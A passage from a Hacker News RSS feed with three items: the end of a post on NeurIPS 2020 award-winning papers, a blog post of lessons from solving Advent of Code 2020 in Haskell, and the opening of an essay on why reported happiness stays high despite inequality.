<p><em>Language models form the backbone of modern techniques for solving a range of problems in natural language processing. The paper shows that when such language models are scaled up to an unprecedented number of parameters, the language model itself can be used as a few-shot learner that achieves very competitive performance on many of these problems without any additional training. This is a very surprising result that is expected to have substantial impact in the field, and that is likely to withstand the test of time. In addition to the scientific contribution of the work, the paper also presents a very extensive and thoughtful exposition of the broader impact of the work, which may serve as an example to the NeurIPS community on how to think about the real-world impact of the research performed by the community.</em></p>
</blockquote></div>
			</div> <!-- .et_pb_text --><div>
				
				
				<p>Read the complete paper<span>&nbsp;</span><strong><a href="https://arxiv.org/pdf/2005.14165.pdf" target="_blank" rel="noopener noreferrer">here</a></strong>.</p>
			</div> <!-- .et_pb_text --><div id="gpt3">
				
				
				<p><h2 role="textbox" aria-multiline="true" contenteditable="true" aria-label="Write heading…">No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<p>This paper addresses the problem related to game theory, computer science, and even economics. To me more specific it starts from the <strong>Nash equilibrium</strong> theory. Nash equilibrium is a concept where the <strong>optimal</strong> outcome of a game is one where no player has a motivation to deviate from her strategy after considering an opponent’s choice. For example, let’s consider two players <em>P1</em> and <em>P2</em> which choose strategies <em>S1</em> and <em>S2</em>. The set of strategies <em>(S1, S2)</em> is a Nash equilibrium if <em>P1</em> doesn’t have other strategies that provide a better payoff than <em>S1</em> in response to <em>P2</em> choosing <em>S2</em>. On the other hand, <em>P2</em> has no other strategy that does better than <em>P2</em> at maximizing her payoff in response to <em>P1</em> choosing <em>S1</em>.</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_metrics_gtu7" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?w=1142&amp;ssl=1 1142w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=1024%2C748&amp;ssl=1 1024w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=768%2C561&amp;ssl=1 768w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=1080%2C789&amp;ssl=1 1080w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=980%2C716&amp;ssl=1 980w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=480%2C351&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=24%2C18&amp;ssl=1 24w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=36%2C26&amp;ssl=1 36w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=48%2C35&amp;ssl=1 48w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=600%2C438&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>However, this theory assumes that interaction among the players is decentralized, which brings us to the conclusion that Nash Equilibrium is a distribution on the <strong>uncorrelated</strong> strategy space. The variation of this theory – <strong>Correlated Equilibrium</strong> assumes that general distribution over joint action profiles is modeled via an external <strong>mediator</strong>. This mediator, privately recommends to each player her next best action. The extension of this theory is called <strong>extensive-form correlated equilibrium (EFCE)</strong> and it is especially useful in sequential strategic interactions. According to this theory, the mediator at the beginning of the interaction gathers all possible recommendations for each step of the sequential interaction. However, she <strong>incrementally</strong> reveals relevant individual moves as the player reaches the step. At each step, the player can accept the mediator’s recommendation or disregard it, but by doing so recommendations are no longer provided for her.</p>
<p>Authors focus on a specific setting – general-sum extensive-form games with an arbitrary number of players. In practice, there is no effective way to solve <strong>EFCE</strong> for this setting. So, the authors essentially showed that is it possible to <strong>devise</strong> simple dynamics that leading to a feasible <strong>EFCE</strong>. They do so by introducing several notions. The first notion is the triggering agent. <strong>Trigger agent</strong> for player i is an agent that takes on the role of player and commits to following all recommendations unless she reaches action <em>I</em> and gets recommended to play action <em>a</em>. If this happens, the player <strong>stops</strong> committing to the recommendations and plays according to a plan until the game ends. Based on this notion of the trigger regret is defined. Trigger regret measures the regret that each trigger agent has for not having played the best-in-hindsight strategy. This is internal regret because it represents cumulative internal regret of player up to iteration <em>T</em>.</p>
<p>Finally, the authors provide an algorithm, called <strong>ICFR</strong>. This is the regret minimization algorithm that minimizes trigger agent regrets via the decomposition of these regrets locally at each information set. That algorithm looks like this:</p></div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/12/1-1.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="1" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
<p><em>Correlated equilibria (CE) are easy to compute and can attain a social welfare that is much higher than that of the better-known Nash equilibria. In normal form games, a surprising feature of CE is that they can be found by simple and decentralized algorithms minimizing a specific …</em></p></blockquote></div></div></div></div></div></div></div></div></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/">https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/</a></em></p>]]>
            </description>
            <link>https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560166</guid>
            <pubDate>Mon, 28 Dec 2020 15:57:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learnings from Solving Advent of Code 2020 in Haskell]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560044">thread link</a>) | @todsacerdoti
<br/>
December 28, 2020 | https://notes.abhinavsarkar.net/2020/aoc-learnings | <a href="https://web.archive.org/web/*/https://notes.abhinavsarkar.net/2020/aoc-learnings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header>
      <span><a href="https://notes.abhinavsarkar.net/">Abhinav's Notes</a></span>
      
    </header>
    <section>
    <span>2020-12-26</span>
    
    
    
    
    
      <a href="https://github.com/abhin4v/notes/edit/master/2020/aoc-learnings.md">Edit</a>
    
    </section>
    <main>
      

<p>After many years of trying unsuccessfully, I finally completed all 25 days of the <a href="https://adventofcode.com/2020/">Advent of Code 2020</a> in Haskell. Here is a summary of my learnings and solutions.</p>

<h2 id="learnings">Learnings</h2>

<ul>
  <li>GHCi is a powerful REPL. We can do almost anything in it which we can do in a file. It is also fast and great to play with code.</li>
  <li><a href="http://learnyouahaskell.com/zippers">Zippers</a> are an awesome technique to move around in a data structure. We can also think of them as focus points in spaces like lines, plains or 3D volumes. Many AoC problems are about moving around in space, doing things at the focus points. Zippers are quite suitable for such problems.</li>
  <li><a href="https://hackage.haskell.org/package/split/docs/Data-List-Split.html">Data.List.Split</a> module is good enough for basic input parsing.</li>
  <li>It is trivially easy to write a simple but feature-rich parser framework in Haskell. <a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">Here</a> is one in its entirety, with some example parsers, in just 24 lines.</li>
  <li><a href="https://hackage.haskell.org/package/graph-wrapper/docs/Data-Graph-Wrapper.html">Data.Graph.Wrapper</a> is a useful wrapper over <a href="https://hackage.haskell.org/package/containers/docs/Data-Graph.html">Data.Graph</a>.</li>
  <li>Haskell is good for writing interpreters.</li>
  <li>Graph traversal + Memoization = Dynamic programming.</li>
  <li>Use <a href="https://hackage.haskell.org/package/MemoTrie/docs/Data-MemoTrie.html">Data.Memotrie</a> for side-effect-free memoization in Haskell.</li>
  <li>Sometimes it’s faster to recompute than to memoize because of the lazy nature of Haskell and the extra memory usage caused by memoization.</li>
  <li><a href="https://hackage.haskell.org/package/comonad">Comonads</a> are great to simulate <a href="https://en.wikipedia.org/wiki/Cellular_automaton">Cellular automata</a>. Zippers are comonads.</li>
  <li>Comonad based cellular automata do not mutate the state of the automata universe, neither do they compute and materialize the whole universe at every step of the automata. Rather, they just stack functions over functions to create new lazy views over the original universe. This means that we can have lazy infinite universes. This also means that simulating cellular automata using comonads tends to get slower with increasing number of neighbours/dimensions.</li>
  <li>Sometimes mutability is the only option if we want to implement a fast algorithm. Mutable vectors from the <a href="https://hackage.haskell.org/package/vector">vector</a> library are great for this.</li>
  <li>Writing the <a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">four-dimensional zipper comonad</a> from scratch is complex and takes a really long time.</li>
  <li><a href="https://english.stackexchange.com/questions/56472/x-y-z-horizontal-vertical-and">There are no words</a> similar to <em>horizontal</em> and <em>vertical</em> for three dimensions or more.</li>
  <li><a href="https://hackage.haskell.org/package/base/docs/Text-ParserCombinators-ReadP.html">ReadP</a> is a good, minimal and easy to use parser framework which is included in the Haskell standard library.</li>
  <li>Try to use <a href="https://en.wikipedia.org/wiki/Bit_array">Bit arrays</a> when they fit, for performant solutions.</li>
  <li>Some problems, when scaled up, cannot be solved with lazy lists in a reasonable time.</li>
  <li>We can simulate a linked list of integers over a vector.</li>
  <li>If a program generates a lot of garbage, turning on multithreading (<code>-threaded</code>) and parallel garbage collection (<code>-qg0 -N</code>) may make it run faster.</li>
  <li>Tweaking the heap size (<code>-H</code>) and the allocation area size (<code>-A</code>) may make a program run faster.</li>
  <li>Use the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html#extension-Strict"><code>Strict</code></a> extension cautiously. Sometimes it may unexpectedly make a program run slower.</li>
  <li><a href="https://www.youtube.com/watch?v=thOifuHs6eY">Hexagons are the bestagons</a>.</li>
</ul>

<h2 id="solutions">Solutions</h2>
<p>Here’s the index of all the solutions I wrote for AoC 2020:</p>

<table>
  <thead>
    <tr>
      <th>Problem</th>
      <th>Solution</th>
      <th>Salient points</th>
      <th>Libraries/modules used</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/1">1</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-1">↗</a></td>
      <td>List comprehensions</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/2">2</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-2">↗</a></td>
      <td>Validation</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/3">3</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-3">↗</a></td>
      <td>Zippers</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/4">4</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-4">↗</a></td>
      <td>Validation</td>
      <td><a href="https://hackage.haskell.org/package/split">split</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/5">5</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-5">↗</a></td>
      <td>Decoding</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/6">6</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-6">↗</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/7">7</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">↗</a></td>
      <td>Parsing, graphs</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a>, <a href="https://hackage.haskell.org/package/graph-wrapper">graph-wrapper</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/8">8</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-8">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/9">9</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-9">↗</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/10">10</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-10">↗</a></td>
      <td>Graphs, memoization</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/11">11</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-11">↗</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Sequence.html">Data.Sequence</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/12">12</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-12">↗</a></td>
      <td>Geometry</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/13">13</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-13">↗</a></td>
      <td>Number theory</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/14">14</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-14">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/15">15</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-15">↗</a></td>
      <td>Number sequence</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Unboxed-Mutable.html">Data.Vector.Unboxed.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/16">16</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-16">↗</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/17">17</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">↗</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/base/docs/Data-List.html">Data.List</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/18">18</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-18">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/19">19</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-19">↗</a></td>
      <td>Parsing</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/20">20</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-20">↗</a></td>
      <td>Image manipulation</td>
      <td><a href="https://hackage.haskell.org/package/bitwise/docs/Data-Array-BitArray.html">Data.Array.BitArray</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/21">21</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-21">↗</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/22">22</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-22">↗</a></td>
      <td>Recursion, game</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/23">23</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-23">↗</a></td>
      <td>Linked list, game</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Primitive-Mutable.html">Data.Vector.Primitive.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/24">24</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-24">↗</a></td>
      <td>Parsing, cellular automata</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Map-Strict.html">Map</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/25">25</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-25">↗</a></td>
      <td>Cryptography</td>
      <td><em>None</em></td>
    </tr>
  </tbody>
</table>

    </main>
    
  </div></div>]]>
            </description>
            <link>https://notes.abhinavsarkar.net/2020/aoc-learnings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560044</guid>
            <pubDate>Mon, 28 Dec 2020 15:45:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is Everyone so damn happy?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560021">thread link</a>) | @RickJWagner
<br/>
December 28, 2020 | https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy | <a href="https://web.archive.org/web/*/https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>I</h2><p>There's a piece of rhetoric that's extremely popular and extremely compelling. It goes something as the following. Sometime over the past four to five decades, we moved into an economy that absolutely doesn't help the working men and women. As a result prices for essentials have soared beyond all recognition, income has fallen for labour, it has fallen even further for those lower down the wealth scale, and most of the gains have all gone to the top 1%.</p><p>But one piece of insight stays inside this tale of woe much like grit in an oyster. It's the fact that annoyingly, a large enough proportion also claim to be happier than they were before.</p><p>What gives?</p><p>For one thing, the self reported life satisfaction in most countries hasn't dropped all that much. Looks like through the biggest financial crisis of around a century and the best boom times before where every stripper seemed to have briefly <a href="https://latimesblogs.latimes.com/money_co/2007/06/tuesday-morning-tales-from-the-bubble----how-a-22-year-old-stripper-bought-10-houses.html">become a real estate mogul</a>, the overall life satisfaction was ... curiously flat?What if we go further back in time?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png&quot;,&quot;height&quot;:485,&quot;width&quot;:781,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we go further back in time?   </p><p>The map looks slightly more complex, but not by a lot. Bear in mind this period saw around four (or five, depending on how you count) major recessions and/or depressions. The fall of the pound, the Asian financial crisis, the dot com boom, the dot com bust, the credit crunch and countless other major macroeconomic events, all put together made minor changes. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fb9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fb9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/b9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png&quot;,&quot;height&quot;:508,&quot;width&quot;:784,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The only major revelations here seem to be that the Greeks are upset after the financial crisis. And that the Germans had a hard decade in the 1990s (maybe something to do with unification throwing part of the country into turmoil perhaps?).</p><p>But it's staggering that for the most part it still trends up even in countries that have seen objective measures of people's unhappiness (or reported as such), including the UK which happily Brexited in annoyance at everyone else surrounding them!</p><p>And in this period, the inequality of happiness has fallen consistently in almost every country you can think of.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png&quot;,&quot;height&quot;:496,&quot;width&quot;:780,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So is it the case that people simply are way too optimistic and/or pessimistic, and that they can't help understand what happiness means to each other?</p><p>Probably not. One of my favourite understanding that came from this deep dive is that it seems literally everyone in the world thinks that others are less happy than they say. It seems this is skepticism run amok!</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff4cbc957-09c7-496f-9401-6329587a39e2_550x550.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff4cbc957-09c7-496f-9401-6329587a39e2_550x550.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f4cbc957-09c7-496f-9401-6329587a39e2_550x550.png&quot;,&quot;height&quot;:550,&quot;width&quot;:550,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we are simply measuring baselines wrong? After all satisfaction and happiness seem like concepts weighted with cultural baggage, and people might tend to put those in context when we answer.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png&quot;,&quot;height&quot;:986,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>Seems to not be a major concern either. I mean, Latin America seems oddly happy with all the coups and currency crises and jaguars roaming over there, but they're not off the charts. Looks like with some minor variation everyone seems to be on the same page.</p><p>So why is everyone so damn happy?</p><h2>II</h2><p>An article in the New York Times by Steven Quartz and Anette Asp called <a href="https://www.nytimes.com/2015/04/12/opinion/sunday/unequal-yet-happy.html">Unequal Yet Happy</a> makes this case.</p><blockquote><p>For most of human history, inequality of wealth meant inequality of happiness. Status, and its related activities, envy and emulation, drove consumption. By the 1950s, rapidly rising standards of living across the West, combined with social pressures to conform, all conspired to intensify status competition. The architects of “rebel cool,” like Jack Kerouac and Norman Mailer, responded by rebelling against emulation consumption and the status hierarchy of postwar America. They inverted the dominant social hierarchy, rejecting the values of those at the top and appropriating the values of those who had been marginalized at the bottom.</p><p>This trade-off comes at a political price, as it makes income inequality less emotionally salient. In a 2013 poll asking Americans to name the most important problems facing the country, only 5 percent cited income inequality or concerns about the poor or middle class (though a recent Gallup poll did find that 67 percent of Americans were dissatisfied with the current income distribution). Politicians from Senator Elizabeth Warren on the left to Representative Paul D. Ryan on the right are talking about inequality, but President Obama has lately been talking more about “opportunity.”</p><p>The proliferation of consumer choice helps explain why today’s Gilded Age hasn’t sparked as much outrage as the last one. Money may not buy happiness in the long run, but consumer choice has gone a long way in keeping most Americans reasonably content, even if they shouldn’t be.</p></blockquote><p>It essentially says that while yeah, we all hate the fact that getting sick costs a bomb, having a roof over your head is crazy expensive, and getting an education means mortgaging your whole life, but as long as you're not being actively crushed under that pressure, life's pretty great. There's Netflix ! And you can even travel anywhere you like - the airplane industry obligingly hasn't turned a profit in decades.</p><p>Is that the answer then? We're so happy with the consumer devices we carry around in our pockets that even though we don't make as much money and life's much harder, we don't care.</p><p>Chalk one up to the awesomeness of the iPhone.</p><p>But in a completely unsurprising addendum to the overall picture, turns out people are more satisfied with their life when they make more money.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png&quot;,&quot;height&quot;:1019,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So there is an unmistakable and very strong correlation across income and happiness across most countries. People are happier when they are richer, and even more happier when they get more richer when in richer countries.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png&quot;,&quot;height&quot;:563,&quot;width&quot;:768,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So is this a kink in the theory that there does seem to be a rising trend in happiness which seems to say people are kinda 'meh' about their dropping incomes and purchasing power?</p><p>There was an observation made by a bummer economist called Richard Easterlin that tried to get to the second derivative of this. He said, looking at the time when satisfaction stagnated in the US between 1946 and 1970, that while richer countries have higher happiness levels, the growth rates in the happiness levels in richer countries didn't seem to be keeping pace with the increase in national incomes. Bear in mind this was a golden age post WWII when the GDP grew 65%+.</p><div><figure><a target="_blank" 